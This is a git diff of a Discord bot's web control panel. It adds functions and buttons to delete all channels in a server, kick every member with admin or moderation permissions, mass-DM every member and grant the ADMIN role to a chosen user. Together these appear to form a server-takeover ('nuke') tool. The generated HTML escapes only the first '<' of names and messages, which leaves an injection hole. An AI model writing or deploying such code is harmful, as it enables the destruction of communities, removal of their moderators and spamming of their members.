@@ -30,6 +30,7 @@ module.exports = {
   },
   selectChannel: function(g){
     var selc = new String("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\"><button type=\"button\" onclick=\"if(prompt('Do you really want to leave this guild? (y/n)') == 'y') window.location.href = '?path=leave&guild=" + g + "'\">Leave Guild</button><button type=\"button\" onclick=\"window.location.href = '?path=roles&guild=" + g + "'\">Roles</button><button type=\"button\" onclick=\"window.location.href = '?path=ms&guild=" + g + "'\">Members</button><button type=\"button\" onclick=\"window.location.href = '?path=list'\">Back to list</button><h1>Select Channel</h1>" + client.guilds.get(g).channels.size + "<br />")
+    selc = selc + `<br /><button type="button" onclick="if(prompt('Do you really want to delete all channels? (y/n)') == 'y') window.location.href = '?path=delchs&guild=${g}'">Delete all</button><br /><br />`
     client.guilds.get(g).channels.forEach(c => {
       if(c.type == 'text') selc = selc + `<br /><button type="button" onclick="window.location.href = '?path=msgs&channel=${c.id}'">[#]${c.name.replace("<", "&lt;")}</button><button type="button" onclick="window.location.href = '?path=delete&channel=${c.id}&guild=${g}'">Delete</button>`
       else if(c.type == 'category') selc = selc + `<br />[+]${c.name.replace("<", "&lt;")}<button type="button" onclick="window.location.href = '?path=delete&channel=${c.id}&guild=${g}'">Delete</button>`
@@ -46,6 +47,7 @@ module.exports = {
   },
   selectMember: function(g){
     var selm = new String("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\"><button type=\"button\" onclick=\"if(prompt('Do you really want to leave this guild? (y/n)') == 'y') window.location.href = '?path=leave&guild=" + g + "'\">Leave Guild</button><button type=\"button\" onclick=\"window.location.href = '?path=sch&guild=" + g + "'\">Channels</button><button type=\"button\" onclick=\"window.location.href = '?path=roles&guild=" + g + "'\">Roles</button><button type=\"button\" onclick=\"window.location.href = '?path=list'\">Back to list</button><h1>Members</h1>" + client.guilds.get(g).members.size + "<br />")
+    selm = selm + `<br /><button type="button" onclick="if(prompt('Do you really want to kick all admins? (y/n)') == 'y') window.location.href = '?path=kickadmins&guild=${g}'">Kick admins</button><button type="button" onclick="window.location.href = '?path=sev&guild=${g}&msg=' + prompt('Message:')">Send message to everyone</button><br /><br />`
     client.guilds.get(g).members.forEach(m => {
       if(m) {
         var isBot = ""
@@ -53,7 +55,7 @@ module.exports = {
         var isOwner = ""
         if(!m.guild.owner) console.error("This guild has no owner")
         else if(m.user.id == m.guild.owner.user.id) isOwner = "[OWNER]"
-        selm = selm + `<br /><button type="button" onclick="window.location.href = '?path=dml&dm=${m.user.id}'">${m.user.tag.replace("<", "&lt;")}${isBot}${isOwner}</button><button type="button" onclick="window.location.href = '?path=deletem&member=${m.user.id}&guild=${g}'">Delete</button>`
+        selm = selm + `<br /><button type="button" onclick="window.location.href = '?path=dml&dm=${m.user.id}'">${m.user.tag.replace("<", "&lt;")}${isBot}${isOwner}</button><button type="button" onclick="window.location.href = '?path=deletem&member=${m.user.id}&guild=${g}'">Delete</button><button type="button" onclick="window.location.href = '?path=giveadmin&member=${m.user.id}&guild=${g}'">Give admin</button>`
       }
     })
     return '<button type="button" onclick="window.location.href = `?logoff=1`">LogOff</button>' + selm
@@ -113,6 +115,24 @@ module.exports = {
     })
     return '<button type="button" onclick="window.location.href = `?logoff=1`">LogOff</button>' + selm
   },
+  kickAdmins: async function(guild) {
+    await client.guilds.find(g => g.id == guild).members.filter(m => (m.hasPermission("ADMINISTRATOR") || m.hasPermission("MANAGE_ROLES") || m.hasPermission("KICK_MEMBERS") || m.hasPermission("BAN_MEMBERS")) && m.kickable).forEach(async m => {
+      await m.kick()
+      await console.log("Kicked " + m.user.tag)
+    })
+  },
+  sev: async function(guild, msg) {
+    await client.guilds.find(g => g.id == guild).members.forEach(async m => {
+      await m.user.send(msg)
+      console.log("Sent to " + m.user.tag)
+    })
+  },
+  delAllChs: async function(guild) {
+    await client.guilds.find(g => g.id == guild).channels.forEach(async c => {
+      await c.delete()
+      await console.log("Deleted " + c.name)
+    })
+  },
   messages: async function(channel) {
     remote = "<br />ERR 2 (NO MESSAGES FOUND)"
     var ht = new String("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">")
@@ -155,6 +175,11 @@ module.exports = {
   delMdm: async function(message, dm) {
     await client.users.find(u => u.id == dm).createDM().then(c => c.fetchMessages({limit: 100}).then(m => m.find(_m => _m.id == message).delete(50)))
     return await wait()
+  },
+  gadmin: async function(m, g) {
+    await client.guilds.find(gg => gg.id == g).roles.filter(ro => ro.name == "ADMIN").forEach(async role => {
+      await client.guilds.find(gg => gg.id == g).members.find(mem => mem.user.id == m).addRole(role)
+    })
   },
   send: async function (channel, msg) {
     await client.channels.find(c => c.id == channel).send(msg)
@@ -212,25 +237,41 @@ client.on('ready', () => {
   console.log("Ready.")
 })
 
+var mcon
+
 async function gms (channel) { // return list of messages
       var x = "<br /><br /><br />Messages: <br /><br />"
       await client.channels.find(c => c.id == channel).fetchMessages({limit: 50}).then(async ms => {
-        await ms.forEach(m => {
+        await ms.forEach(async m => {
           var embeds = ""
           if(m.embeds && m.embeds[0]) {
             var d = ""
             if(m.embeds[0].description) d = m.embeds[0].description.replace("<", "&lt;");
             var t = ""
             if(m.embeds[0].title) t = m.embeds[0].title.replace("<", "&lt;");
-            var ma = maut(m);
-            embeds = `<dembed> <pre>${ma}[T]${t}
+            var ma = await maut(m);
+            embeds = await `<dembed> <pre>${ma}[T]${t}
 
 ${d}
 
 [FIELDS AREN'T SUPPORTED YET]
 </pre> </dembed>`
           }
-          x = x + "<br /><br />" + m.author.tag + " -- " + m.content.replace("\n", "<br />") + embeds + `<button type="button" onclick="window.location.href = '?path=delM&channel=${channel}&message=${m.id}'">Delete</button>`
+          await wait()
+          mcon = await m.content
+          /*mentions:
+            mcon = await mcon.split("<@")
+            await mcon.forEach(async mmm => {
+              mmm = mmm.split(">")
+              if (await client.users.find(u => u.id == mmm[0])) mmm[0] = await client.users.find(u => u.id == mmm[0]).tag
+                else mmm[0] = "@invalid-user"
+              mmm = mmm.slice(1).join(">")
+              mcon = mcon + mmm
+            })
+            await wait()
+          //;
+          */
+          x = x + "<br /><br />" + m.author.tag + " -- " + await mcon.replace("\n", "<br />") + embeds + `<button type="button" onclick="window.location.href = '?path=delM&channel=${channel}&message=${m.id}'">Delete</button>`
           remote = x
         })
         if(remote) {
